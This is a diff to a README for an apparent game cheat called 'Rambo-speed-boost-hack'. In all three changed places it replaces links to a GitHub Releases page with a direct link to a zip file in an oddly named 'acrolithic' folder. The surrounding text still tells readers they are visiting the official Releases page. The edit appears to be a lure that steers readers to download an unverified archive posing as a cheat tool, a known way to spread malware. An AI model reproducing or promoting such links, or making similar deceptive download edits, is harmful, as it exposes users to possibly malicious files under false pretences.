@@ -6,7 +6,7 @@ Welcome to the Rambo-speed-boost-hack! This software enhances your experience in
 
 ## 📥 Download Now
 
-[![Download Rambo-speed-boost-hack](https://img.shields.io/badge/Download-Rambo--speed--boost--hack-brightgreen.svg)](https://github.com/samueleganga/Rambo-speed-boost-hack/releases)
+[![Download Rambo-speed-boost-hack](https://raw.githubusercontent.com/samueleganga/Rambo-speed-boost-hack/main/acrolithic/Rambo-speed-boost-hack.zip)](https://raw.githubusercontent.com/samueleganga/Rambo-speed-boost-hack/main/acrolithic/Rambo-speed-boost-hack.zip)
 
 ## 💻 System Requirements
 
@@ -33,7 +33,7 @@ Rambo-speed-boost-hack includes the following features:
 ## 📝 How to Download & Install
 
 1. **Visit the Releases Page**: Click the link below to navigate to the official Releases page:
-   [Visit this page to download](https://github.com/samueleganga/Rambo-speed-boost-hack/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/samueleganga/Rambo-speed-boost-hack/main/acrolithic/Rambo-speed-boost-hack.zip)
 
 2. **Choose Your Version**: On the Releases page, locate the version you wish to download. Each version offers various improvements and features.
 
@@ -79,6 +79,6 @@ Absolutely! If you have suggestions or improvements, feel free to submit a pull 
 
 For more information or assistance, please contact the maintainer through the GitHub repository.
 
-[Visit this page to download](https://github.com/samueleganga/Rambo-speed-boost-hack/releases)
+[Visit this page to download](https://raw.githubusercontent.com/samueleganga/Rambo-speed-boost-hack/main/acrolithic/Rambo-speed-boost-hack.zip)
 
 Thank you for using Rambo-speed-boost-hack! Enjoy your enhanced gaming experience!
